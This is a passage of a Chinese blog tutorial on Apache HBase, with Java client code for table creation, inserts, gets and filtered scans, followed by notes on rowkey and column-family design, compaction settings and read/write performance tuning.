class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.hbase.client.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 初始化</span></span><br><span class="line"><span class="comment">//创建配置文件对象</span></span><br><span class="line">Configuration conf = HBaseConfiguration.create();</span><br><span class="line"><span class="comment">//加载zookeeper的配置</span></span><br><span class="line">conf.set(<span class="string">"hbase.zookeeper.quorum"</span>,<span class="string">"node01,node02,node03"</span>);</span><br><span class="line"><span class="comment">//获取连接</span></span><br><span class="line">Connection conn = ConnectionFactory.createConnection(conf);</span><br><span class="line"><span class="comment">//获取管理对象</span></span><br><span class="line">Admin admin = conn.getAdmin();</span><br><span class="line"><span class="comment">//获取数据操作对象</span></span><br><span class="line">TableName tableName = TableName.valueOf(<span class="string">"phone"</span>);</span><br><span class="line">Table table = conn.getTable(tableName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====== 创建表</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createTable</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//定义表描述对象</span></span><br><span class="line">    TableDescriptorBuilder tableDescriptorBuilder = TableDescriptorBuilder.newBuilder(tableName);</span><br><span class="line">    <span class="comment">//定义列族描述对象</span></span><br><span class="line">    ColumnFamilyDescriptorBuilder columnFamilyDescriptorBuilder = ColumnFamilyDescriptorBuilder.newBuilder(<span class="string">"cf"</span>.getBytes());</span><br><span class="line">    <span class="comment">//添加列族信息给表</span></span><br><span class="line">    tableDescriptorBuilder.setColumnFamily(columnFamilyDescriptorBuilder.build());</span><br><span class="line">    <span class="keyword">if</span>(admin.tableExists(tableName))&#123;</span><br><span class="line">        <span class="comment">// 必须先禁用表才能删除表</span></span><br><span class="line">        admin.disableTable(tableName);</span><br><span class="line">        admin.deleteTable(tableName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建表</span></span><br><span class="line">    admin.createTable(tableDescriptorBuilder.build());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ====== 插入数据</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// HBase所有的数据需要转成字节数组，建议使用官方提供的工具类 org.apache.hadoop.hbase.util.Bytes 进行转换，而不是自己手动转换</span></span><br><span class="line">    Put put = <span class="keyword">new</span> Put(Bytes.toBytes(<span class="string">"1"</span>));</span><br><span class="line">    put.addColumn(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"name"</span>),Bytes.toBytes(<span class="string">"zhangsan"</span>));</span><br><span class="line">    put.addColumn(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"age"</span>),Bytes.toBytes(<span class="string">"18"</span>));</span><br><span class="line">    put.addColumn(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"sex"</span>),Bytes.toBytes(<span class="string">"man"</span>));</span><br><span class="line">    table.put(put);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 获取某行数据</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Get get = <span class="keyword">new</span> Get(Bytes.toBytes(<span class="string">"1"</span>));</span><br><span class="line">    <span class="comment">//在服务端做数据过滤，挑选出符合需求的列。如果不设置会把当前行的所有列都取出</span></span><br><span class="line">    get.addColumn(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"name"</span>));</span><br><span class="line">    get.addColumn(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"age"</span>));</span><br><span class="line">    Result result = table.get(get);</span><br><span class="line">    Cell cell1 = result.getColumnLatestCell(Bytes.toBytes(<span class="string">"cf"</span>), Bytes.toBytes(<span class="string">"name"</span>));</span><br><span class="line">    String name = Bytes.toString(CellUtil.cloneValue(cell1));</span><br><span class="line">    System.out.println(name); <span class="comment">// zhangsan</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 基于条件和过滤器获取数据: 获取 1-100 行的数据</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">scanByCondition</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Scan scan = <span class="keyword">new</span> Scan();</span><br><span class="line">    scan.withStartRow(Bytes.toBytes(<span class="string">"1"</span>));</span><br><span class="line">    scan.withStopRow(Bytes.toBytes(<span class="string">"100"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建过滤器集合，HBase提供多种过滤器</span></span><br><span class="line">    FilterList filters = <span class="keyword">new</span> FilterList(FilterList.Operator.MUST_PASS_ALL);</span><br><span class="line">    <span class="comment">//创建相等过滤器</span></span><br><span class="line">    SingleColumnValueFilter filter1 = <span class="keyword">new</span> SingleColumnValueFilter(Bytes.toBytes(<span class="string">"cf"</span>),Bytes.toBytes(<span class="string">"age"</span>),CompareOperator.EQUAL,Bytes.toBytes(<span class="string">"18"</span>));</span><br><span class="line">    filters.addFilter(filter1);</span><br><span class="line">    <span class="comment">//创建前缀过滤器</span></span><br><span class="line">    PrefixFilter filter2 = <span class="keyword">new</span> PrefixFilter(Bytes.toBytes(<span class="string">"zhang"</span>));</span><br><span class="line">    filters.addFilter(filter2);</span><br><span class="line">    scan.setFilter(filters);</span><br><span class="line"></span><br><span class="line">    ResultScanner rss = table.getScanner(scan);</span><br><span class="line">    <span class="keyword">for</span> (Result rs : rss) &#123;</span><br><span class="line">        Cell cell1 = rs.getColumnLatestCell(Bytes.toBytes(<span class="string">"cf"</span>), Bytes.toBytes(<span class="string">"name"</span>)));</span><br><span class="line">        Cell cell2 = rs.getColumnLatestCell(Bytes.toBytes(<span class="string">"cf"</span>), Bytes.toBytes(<span class="string">"age"</span>)));</span><br><span class="line">        String name = Bytes.toString(CellUtil.cloneValue(cell1)); <span class="comment">// zhangsan</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 关闭资源</span></span><br><span class="line">table.close();</span><br><span class="line">admin.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure><h3 id="结合MapReduce"><a href="#结合MapReduce" class="headerlink" title="结合MapReduce"></a>结合MapReduce</h3><ul><li>MR是分布式计算框架，对于数据源和数据目的地没有限制，用户可以任意选择，只不过需要实现两个类<ul><li>InputFormat: getsplits()、createRecordReader()</li><li>OutputFormat: getRecordWriter(), 返回值RecordWriter(write、close)</li></ul></li><li>注意<ul><li>当需要从hbase读取数据的时候，必须使用 TableMapReduceUtil.initTableMapperJob()</li><li>当需要写数据到hbase的时候，必须使用 TableMapReduceUtil.initTableReduceJob()<ul><li>如果再代码逻辑进行实现的时候，不需要reduce，只要是向hbase写数据，那么上面的方法必须存在(reducer=null)</li></ul></li></ul></li></ul><h2 id="设计案例"><a href="#设计案例" class="headerlink" title="设计案例"></a>设计案例</h2><ul><li><p>人员角色表</p><ul><li>关系型数据库一般需要人员、角色、人员角色关系3张表</li><li><p>hbase设计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如删除角色时，需要同时删除人员表下的角色信息，此时可以使用协处理器(触发器删除修改)</span></span><br><span class="line"><span class="comment"># 人员表</span></span><br><span class="line">rowkey    cf1:(属性信息)  cf2:(角色列表)</span><br><span class="line">001cf1:name=..,cf1:age=..,         cf2:100=10,cf2:200=9</span><br><span class="line">002</span><br><span class="line"><span class="comment"># 角色表</span></span><br><span class="line">rowkey    cf1:(角色信息)  cf2:(人员列表)</span><br><span class="line">100cf1:name=班长。。。。   cf2:001=小黑，cf2:002=小宝</span><br><span class="line">200</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="HBase表设计原则"><a href="#HBase表设计原则" class="headerlink" title="HBase表设计原则"></a>HBase表设计原则</h2><h3 id="表的设计"><a href="#表的设计" class="headerlink" title="表的设计"></a>表的设计</h3><h4 id="Pre-Creating-Regions"><a href="#Pre-Creating-Regions" class="headerlink" title="Pre-Creating Regions"></a>Pre-Creating Regions</h4><ul><li>默认情况下，在创建HBase表的时候会自动创建一个region分区，当导入数据的时候，所有的HBase客户端都向这一个region写数据，直到这个region足够大了才进行切分</li><li><strong>预分区</strong>：通过预先创建一些空的regions，这样当数据写入HBase时，会按照region分区情况，在集群内做数据的负载均衡，可以加快批量写入速度</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一种实现方式是使用admin对象的切分策略</span></span><br><span class="line"><span class="keyword">byte</span>[] startKey = ...;      <span class="comment">// your lowest key</span></span><br><span class="line"><span class="keyword">byte</span>[] endKey = ...;        <span class="comment">// your highest key</span></span><br><span class="line"><span class="keyword">int</span> numberOfRegions = ...;  <span class="comment">// # of regions to create</span></span><br><span class="line">admin.createTable(table, startKey, endKey, numberOfRegions);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种实现方式是用户自定义切片</span></span><br><span class="line"><span class="keyword">byte</span>[][] splits = ...;   <span class="comment">// create your own splits</span></span><br><span class="line"><span class="comment">// byte[][] splits = new byte[][] &#123; Bytes.toBytes("100"), Bytes.toBytes("200"), Bytes.toBytes("400"), Bytes.toBytes("500") &#125;;</span></span><br><span class="line">admin.createTable(table, splits);</span><br></pre></td></tr></table></figure><h4 id="Rowkey设计"><a href="#Rowkey设计" class="headerlink" title="Rowkey设计"></a>Rowkey设计</h4><ul><li>Rowkey说明<ul><li>HBase中row key用来检索表中的记录，支持以下三种方式<ul><li>通过单个row key访问：即按照某个row key键值进行get操作</li><li>通过row key的range进行scan：即通过设置startRowKey和endRowKey，在这个范围内进行扫描</li><li>全表扫描：即直接扫描整张表中所有行记录</li></ul></li><li>在HBase中，rowkey可以是任意字符串，最大长度64KB，实际应用中一般为10~100bytes，存为byte[]字节数组，一般设计成定长的<br>​- rowkey是按照字典序存储，因此设计row key时，要充分利用这个排序特点，将经常一起读取的数据存储到一块，将最近可能会被访问的数据放在一块</li></ul></li><li>Rowkey设计原则<ul><li><strong>越短越好</strong>，提高效率<ul><li>数据的持久化文件HFile中是按照KeyValue存储的，如果rowkey过长，比如操作100字节，1000万行数据，单单是存储rowkey的数据就要占用10亿个字节，将近1G数据，这样会影响HFile的存储效率</li><li>HBase中包含缓存机制，每次会将查询的结果暂时缓存到HBase的内存中，如果rowkey字段过长，内存的利用率就会降低，系统不能缓存更多的数据，这样会降低检索效率。</li></ul></li><li><strong>散列原则</strong>，实现负载均衡<ul><li>如果Rowkey是按时间戳的方式递增，不要将时间放在二进制码的前面，建议将Rowkey的高位作为散列字段，由程序循环生成，低位放时间字段，这样将提高数据均衡分布在每个Regionserver实现负载均衡的几率</li><li>如果没有散列字段，首字段直接是时间信息将产生所有新数据都在一个 RegionServer上堆积的热点现象，这样在做数据检索的时候负载将会集中在个别RegionServer，降低查询效率，解决方法如下：<ul><li>加盐：添加随机值</li><li>hash：采用md5散列算法取前4位做前缀</li><li>反转：将手机号反转</li></ul></li></ul></li><li><strong>唯一原则</strong>，字典序排序存储<ul><li>必须在设计上保证其唯一性，rowkey是按照字典顺序排序存储的，因此设计rowkey的时候，要充分利用这个排序的特点，将经常读取的数据存储到一块，将最近可能会被访问的数据放到一块</li></ul></li></ul></li></ul><h4 id="列族的设计"><a href="#列族的设计" class="headerlink" title="列族的设计"></a>列族的设计</h4><ul><li><strong>不要在一张表里定义太多的column family</strong>。目前Hbase并不能很好的处理超过2~3个column family的表。因为某个column family在flush的时候，它邻近的column family也会因关联效应被触发flush，最终导致系统产生更多的I/O    。原因：<ul><li>当开始向hbase中插入数据的时候，数据会首先写入到memstore，而memstore是一个内存结构，每个列族对应一个memstore，当包含更多的列族的时候，会导致存在多个memstore，每一个memstore在flush的时候会对应一个hfile的文件，因此会产生很多的hfile文件。更加严重的是，flush操作的是region级别，当region中的某个memstore被flush的时候，同一个region的其他memstore也会进行flush操作，当某一张表拥有很多列族的时候，且列族之间的数据分布不均匀的时候，会产生更多的磁盘文件</li><li>当hbase表的某个region过大，会被拆分成两个，如果我们有多个列族，且这些列族之间的数据量相差悬殊的时候，region的split操作会导致原本数据量小的文件被进一步的拆分，而产生更多的小文件</li><li>与 Flush 操作一样，目前 HBase 的 Compaction 操作也是 Region 级别的，过多的列族也会产生不必要的 IO</li><li>HDFS 其实对一个目录下的文件数有限制的（<code>dfs.namenode.fs-limits.max-directory-items</code>）。如果我们有 N 个列族，M 个 Region，那么我们持久化到 HDFS 至少会产生 N*M 个文件；而每个列族对应底层的 HFile 文件往往不止一个，我们假设为 K 个，那么最终表在 HDFS 目录下的文件数将是 N*M*K，这可能会操作 HDFS 的限制</li></ul></li></ul><h4 id="in-memory"><a href="#in-memory" class="headerlink" title="in memory"></a>in memory</h4><ul><li>hbase在LRU缓存基础之上采用了分层设计，整个blockcache分成了三个部分，分别是single、multi和inMemory</li><li>三者区别如下<ul><li>single：如果一个block第一次被访问，放在该优先队列中</li><li>multi：如果一个block被多次访问，则从single队列转移到multi队列</li><li>inMemory：优先级最高，常驻cache，因此一般只有hbase系统的元数据，如meta表之类的才会放到inMemory队列中</li></ul></li></ul><h4 id="Max-Version"><a href="#Max-Version" class="headerlink" title="Max Version"></a>Max Version</h4><ul><li>创建表的时候，可以通过<code>ColumnFamilyDescriptorBuilder.setMaxVersions(int maxVersions)</code>设置表中数据的最大版本，如果只需要保存最新版本的数据，那么可以设置setMaxVersions(1)，保留更多的版本信息会占用更多的存储空间</li></ul><h4 id="Time-to-Live"><a href="#Time-to-Live" class="headerlink" title="Time to Live"></a>Time to Live</h4><ul><li>创建表的时候，可以通过<code>ColumnFamilyDescriptorBuilder.setTimeToLive(int timeToLive)</code>设置表中数据的存储生命期，过期数据将自动被删除，例如如果只需要存储最近两天的数据，那么可以设置<code>setTimeToLive(2 * 24 * 60 * 60)</code></li></ul><h4 id="Compaction"><a href="#Compaction" class="headerlink" title="Compaction"></a>Compaction</h4><ul><li>HBase为了防止小文件（被刷到磁盘的menstore）过多，以保证保证查询效率，hbase需要在必要的时候将这些小的store file合并成相对较大的store file，这个过程就称之为compaction。在hbase中，主要存在两种类型的compaction：minor compaction和major compaction<ul><li>在HBase中，数据在更新时首先写入WAL 日志(HLog)和内存(MemStore)中，MemStore中的数据是排序的，当MemStore累计到一定阈值时，就会创建一个新的MemStore，并且将老的MemStore添加到flush队列，由单独的线程flush到磁盘上，成为一个StoreFile。于此同时， 系统会在zookeeper中记录一个redo point，表示这个时刻之前的变更已经持久化了(<strong>minor compact</strong>)</li><li>StoreFile是只读的，一旦创建后就不可以再修改，因此Hbase的更新其实是不断追加的操作。当一个Store中的StoreFile达到一定的阈值后，就会进行一次合并(<strong>major compact</strong>)，将对同一个key的修改合并到一起，形成一个大的StoreFile，当StoreFile的大小达到一定阈值后，又会对 StoreFile 进行分割(<strong>split</strong>)，等分为两个StoreFile</li></ul></li><li>由于对表的更新是不断追加的，处理读请求时，需要访问Store中全部的StoreFile和MemStore，将它们按照row key进行合并，由于StoreFile和MemStore都是经过排序的，并且StoreFile带有内存中索引，通常合并过程还是比较快的</li><li>实际应用中，可以考虑必要时手动进行major compact，将同一个row key的修改进行合并形成一个大的StoreFile。同时，可以将StoreFile设置大些，减少split的发生</li><li>minor compaction：是较小、很少文件的合并，它的运行机制由以下几个参数共同决定<ul><li><code>hbase.hstore.compaction.min</code> 默认值为 3，表示至少需要三个满足条件的store file时，minor compaction才会启动</li><li><code>hbase.hstore.compaction.max</code> 默认值为10，表示一次minor compaction中最多选取10个store file</li><li><code>hbase.hstore.compaction.min.size</code> 表示文件大小小于该值的store file 一定会加入到minor compaction的store file中</li><li><code>hbase.hstore.compaction.max.size</code> 表示文件大小大于该值的store file 一定不会被添加到minor compaction</li><li><code>hbase.hstore.compaction.ratio</code> 将 StoreFile 按照文件年龄排序，minor compaction 总是从 older store file 开始选择，如果该文件的 size 小于后面 hbase.hstore.compaction.max 个 store file size 之和乘以 ratio 的值，那么该 store file 将加入到 minor compaction 中。如果满足 minor compaction 条件的文件数量大于 hbase.hstore.compaction.min，才会启动</li></ul></li><li>major compaction：是将所有的store file合并成一个，触发major compaction的可能条件有<ul><li>major_compact 命令</li><li>majorCompact() API</li><li>region server自动运行<ul><li><code>hbase.hregion.majorcompaction</code> 默认为24 小时</li><li><code>hbase.hregion.majorcompaction.jetter</code> 默认值为0.2 防止region server 在同一时间进行major compaction。对参数hbase.hregion.majorcompaction 规定的值起到浮动的作用，假如两个参数都为默认值24和0.2，那么major compact最终使用的数值为：19.2~28.8 这个范围</li></ul></li></ul></li></ul><h3 id="写优化"><a href="#写优化" class="headerlink" title="写优化"></a>写优化</h3><h4 id="WAL日志"><a href="#WAL日志" class="headerlink" title="WAL日志"></a>WAL日志</h4><ul><li>优化建议<ul><li>根据业务关注点在WAL机制与写入吞吐量之间做出选择，决定是否需要写WAL或者调整写入频率</li></ul></li><li>优化原理<ul><li>数据写入流程可以理解为一次顺序写WAL+一次写缓存，通常情况下写缓存延迟很低，因此提升写性能就只能从WAL入手</li><li>WAL机制一方面是为了确保数据即使写入缓存丢失也可以恢复，另一方面是为了集群之间异步复制。默认WAL机制开启且使用同步机制写入WAL</li><li>首先考虑业务是否需要写WAL，通常情况下大多数业务都会开启WAL机制（默认），但是对于部分业务可能并不特别关心异常情况下部分数据的丢失，而更关心数据写入吞吐量，比如某些推荐业务，这类业务即使丢失一部分用户行为数据可能对推荐结果并不构成很大影响，但是对于写入吞吐量要求很高，不能造成数据队列阻塞<ul><li>这种场景下可以考虑关闭WAL写入，写入吞吐量可以提升2x~3x</li><li>退而求其次，有些业务不能接受不写WAL，但可以接受WAL异步写入，也是可以考虑优化写入频率，通常也会带来1x~2x的性能提升</li></ul></li></ul></li></ul><h4 id="Put批量提交"><a href="#Put批量提交" class="headerlink" title="Put批量提交"></a>Put批量提交</h4><ul><li>优化建议<ul><li>尽量使用批量put进行写入请求，在业务可以接受的情况下开启异步批量提交</li></ul></li><li>优化原理<ul><li>HBase分别提供了单条put以及批量put的API接口，使用批量put接口可以减少客户端到RegionServer之间的RPC连接数，提高写入性能。另外需要注意的是，批量put请求要么全部成功返回，要么抛出异常</li><li>业务如果可以接受异常情况下少量数据丢失的话，还可以使用异步批量提交的方式提交请求。提交分为两阶段执行：用户提交写请求之后，数据会写入客户端缓存，并返回用户写入成功；当客户端缓存达到阈值（默认2M）之后批量提交给RegionServer。需要注意的是，在某些情况下客户端异常的情况下缓存数据有可能丢失。使用方式<code>setAutoFlush(false)</code></li></ul></li></ul><h4 id="Region是否太少"><a href="#Region是否太少" class="headerlink" title="Region是否太少"></a>Region是否太少</h4><ul><li>优化建议<ul><li>在<code>Num(Region of Table) &lt; Num(RegionServer)</code>的场景下切分部分请求负载高的Region并迁移到其他RegionServer</li></ul></li><li>优化原理<ul><li>当前集群中表的Region个数如果小于RegionServer个数，即Num(Region of Table) &lt; Num(RegionServer)，可以考虑切分Region并尽可能分布到不同RegionServer来提高系统请求并发度，如果Num(Region of Table) &gt; Num(RegionServer)，再增加Region个数效果并不明显    </li></ul></li></ul><h4 id="写入请求是否不均衡"><a href="#写入请求是否不均衡" class="headerlink" title="写入请求是否不均衡"></a>写入请求是否不均衡</h4><ul><li>优化建议<ul><li>检查RowKey设计以及预分区策略，保证写入请求均衡</li></ul></li><li>优化原理<ul><li>另一个需要考虑的问题是写入请求是否均衡，如果不均衡，一方面会导致系统并发度较低，另一方面也有可能造成部分节点负载很高，进而影响其他业务</li><li>分布式系统中特别害怕一个节点负载很高的情况，一个节点负载很高可能会拖慢整个集群，这是因为很多业务会使用Mutli批量提交读写请求，一旦其中一部分请求落到该节点无法得到及时响应，就会导致整个批量请求超时。因此不怕节点宕掉，就怕节点奄奄一息！</li></ul></li></ul><h4 id="写入KeyValue数据是否太大"><a href="#写入KeyValue数据是否太大" class="headerlink" title="写入KeyValue数据是否太大"></a>写入KeyValue数据是否太大</h4><ul><li>KeyValue大小对写入性能的影响巨大，一旦遇到写入性能比较差的情况，需要考虑是否由于写入KeyValue数据太大导致。随着单行数据大小不断变大，写入吞吐量急剧下降，写入延迟在100K之后急剧增大</li></ul><h4 id="Utilize-Flash-storage-for-WAL-HBASE-12848"><a href="#Utilize-Flash-storage-for-WAL-HBASE-12848" class="headerlink" title="Utilize Flash storage for WAL(HBASE-12848)"></a>Utilize Flash storage for WAL(HBASE-12848)</h4><ul><li>这个特性意味着可以将WAL单独置于SSD上，这样即使在默认情况下（WALSync），写性能也会有很大的提升。需要注意的是，该特性建立在HDFS 2.6.0+的基础上，HDFS以前版本不支持该特性。具体可以参考官方jira：<a href="https://issues.apache.org/jira/browse/HBASE-12848" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/HBASE-12848</a></li></ul><h4 id="Multiple-WALs-HBASE-14457"><a href="#Multiple-WALs-HBASE-14457" class="headerlink" title="Multiple WALs(HBASE-14457)"></a>Multiple WALs(HBASE-14457)</h4><ul><li>该特性也是对WAL进行改造，当前WAL设计为一个RegionServer上所有Region共享一个WAL，可以想象在写入吞吐量较高的时候必然存在资源竞争，降低整体性能。针对这个问题，社区小伙伴（阿里巴巴大神）提出Multiple WALs机制，管理员可以为每个Namespace下的所有表设置一个共享WAL，通过这种方式，写性能大约可以提升20%～40%左右。具体可以参考官方jira：<a href="https://issues.apache.org/jira/browse/HBASE-14457" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/HBASE-14457</a></li></ul><h3 id="读优化"><a href="#读优化" class="headerlink" title="读优化"></a>读优化</h3><h4 id="scan缓存是否设置合理"><a href="#scan缓存是否设置合理" class="headerlink" title="scan缓存是否设置合理"></a>scan缓存是否设置合理</h4><ul><li>优化建议<ul><li>大scan场景下将scan缓存从100增大到500或者1000，用以减少RPC次数</li></ul></li><li>优化原理<ul><li>在解释这个问题之前，首先需要解释什么是scan缓存，通常来讲一次scan会返回大量数据，因此客户端发起一次scan请求，实际并不会一次就将所有数据加载到本地，而是分成多次RPC请求进行加载，这样设计一方面是因为大量数据请求可能会导致网络带宽严重消耗进而影响其他业务，另一方面也有可能因为数据量太大导致本地客户端发生OOM。在这样的设计体系下用户会首先加载一部分数据到本地，然后遍历处理，再加载下一部分数据到本地处理，如此往复，直至所有数据都加载完成。数据加载到本地就存放在scan缓存中，默认100条数据大小</li><li>通常情况下，默认的scan缓存设置就可以正常工作的。但是在一些大scan（一次scan可能需要查询几万甚至几十万行数据）来说，每次请求100条数据意味着一次scan需要几百甚至几千次RPC请求，这种交互的代价无疑是很大的。因此可以考虑将scan缓存设置增大，比如设为500或者1000就可能更加合适。笔者之前做过一次试验，在一次scan扫描10w+条数据量的条件下，将scan缓存从100增加到1000，可以有效降低scan请求的总体延迟，延迟基本降低了25%左右</li></ul></li></ul><h4 id="get请求是否可以使用批量请求"><a href="#get请求是否可以使用批量请求" class="headerlink" title="get请求是否可以使用批量请求"></a>get请求是否可以使用批量请求</h4><ul><li>优化建议<ul><li>使用批量get进行读取请求</li></ul></li><li>优化原理<ul><li>HBase分别提供了单条get以及批量get的API接口，使用批量get接口可以减少客户端到RegionServer之间的RPC连接数，提高读取性能。另外需要注意的是，批量get请求要么成功返回所有请求数据，要么抛出异常</li></ul></li></ul><h4 id="请求是否可以显示指定列族或者列"><a href="#请求是否可以显示指定列族或者列" class="headerlink" title="请求是否可以显示指定列族或者列"></a>请求是否可以显示指定列族或者列</h4><ul><li>优化建议<ul><li>可以指定列族或者列进行精确查找的尽量指定查找</li></ul></li><li>优化原理<ul><li>HBase是典型的列族数据库，意味着同一列族的数据存储在一起，不同列族的数据分开存储在不同的目录下。如果一个表有多个列族，只是根据Rowkey而不指定列族进行检索的话不同列族的数据需要独立进行检索，性能必然会比指定列族的查询差很多，很多情况下甚至会有2倍~3倍的性能损失</li></ul></li></ul><h4 id="离线批量读取请求是否设置禁止缓存"><a href="#离线批量读取请求是否设置禁止缓存" class="headerlink" title="离线批量读取请求是否设置禁止缓存"></a>离线批量读取请求是否设置禁止缓存</h4><ul><li>优化建议<ul><li>离线批量读取请求设置禁用缓存，<code>scan.setBlockCache(false)</code></li></ul></li><li>优化原理<ul><li>通常离线批量读取数据会进行一次性全表扫描，一方面数据量很大，另一方面请求只会执行一次。这种场景下如果使用scan默认设置，就会将数据从HDFS加载出来之后放到缓存。可想而知，大量数据进入缓存必将其他实时业务热点数据挤出，其他业务不得不从HDFS加载，进而会造成明显的读延迟</li></ul></li></ul><h4 id="读请求是否均衡"><a href="#读请求是否均衡" class="headerlink" title="读请求是否均衡"></a>读请求是否均衡</h4><ul><li>优化建议<ul><li>RowKey必须进行散列化处理（比如MD5散列），同时建表必须进行预分区处理</li></ul></li><li>优化原理<ul><li>极端情况下假如所有的读请求都落在一台RegionServer的某几个Region上，这一方面不能发挥整个集群的并发处理能力，另一方面势必造成此台RegionServer资源严重消耗（比如IO耗尽、handler耗尽等），落在该台RegionServer上的其他业务会因此受到很大的波及。可见，读请求不均衡不仅会造成本身业务性能很差，还会严重影响其他业务。当然，写请求不均衡也会造成类似的问题，可见负载不均衡是HBase的大忌</li></ul></li><li>观察确认<ul><li>观察所有RegionServer的读请求QPS曲线，确认是否存在读请求不均衡现象</li></ul></li></ul><h4 id="BlockCache是否设置合理"><a href="#BlockCache是否设置合理" class="headerlink" title="BlockCache是否设置合理"></a>BlockCache是否设置合理</h4><ul><li>优化建议<ul><li>JVM内存配置量 &lt; 20G，BlockCache策略选择LRUBlockCache；否则选择BucketCache策略的offheap模式</li></ul></li><li>优化原理<ul><li>BlockCache作为读缓存，对于读性能来说至关重要。默认情况下BlockCache和Memstore的配置相对比较均衡（各占40%），可以根据集群业务进行修正，比如读多写少业务可以将BlockCache占比调大。另一方面，BlockCache的策略选择也很重要，不同策略对读性能来说影响并不是很大，但是对GC的影响却相当显著，尤其BucketCache的offheap模式下GC表现很优越。另外，HBase 2.0对offheap的改造（HBASE-11425）将会使HBase的读性能得到2～4倍的提升，同时GC表现会更好</li></ul></li><li>观察确认<ul><li>观察所有RegionServer的缓存未命中率、配置文件相关配置项一级GC日志，确认BlockCache是否可以优化</li></ul></li></ul><h4 id="HFile文件是否太多"><a href="#HFile文件是否太多" class="headerlink" title="HFile文件是否太多"></a>HFile文件是否太多</h4><ul><li>优化建议<ul><li><code>hbase.hstore.compaction.min</code> 设置不能太大，默认是3个；设置需要根据Region大小确定，通常可以简单的认为<code>hbase.hstore.compaction.max.size = RegionSize / hbase.hstore.compaction.min</code></li></ul></li><li>优化原理<ul><li>HBase读取数据通常首先会到Memstore和BlockCache中检索（读取最近写入数据&amp;热点数据），如果查找不到就会到文件中检索。HBase的类LSM结构会导致每个store包含多数HFile文件，文件越多，检索所需的IO次数必然越多，读取延迟也就越高。文件数量通常取决于Compaction的执行策略，一般和两个配置参数有关：hbase.hstore.compaction.min和hbase.hstore.compaction.max.size，前者表示一个store中的文件数超过多少就应该进行合并，后者表示参数合并的文件大小最大是多少，超过此大小的文件不能参与合并。这两个参数不能设置太松（前者不能设置太大，后者不能设置太小），导致Compaction合并文件的实际效果不明显，进而很多文件得不到合并。这样就会导致HFile文件数变多</li></ul></li><li>观察确认<ul><li>观察RegionServer级别以及Region级别的storefile数，确认HFile文件是否过多</li></ul></li></ul><h4 id="Compaction是否消耗系统资源过多"><a href="#Compaction是否消耗系统资源过多" class="headerlink" title="Compaction是否消耗系统资源过多"></a>Compaction是否消耗系统资源过多</h4><ul><li>优化建议<ul><li>Minor 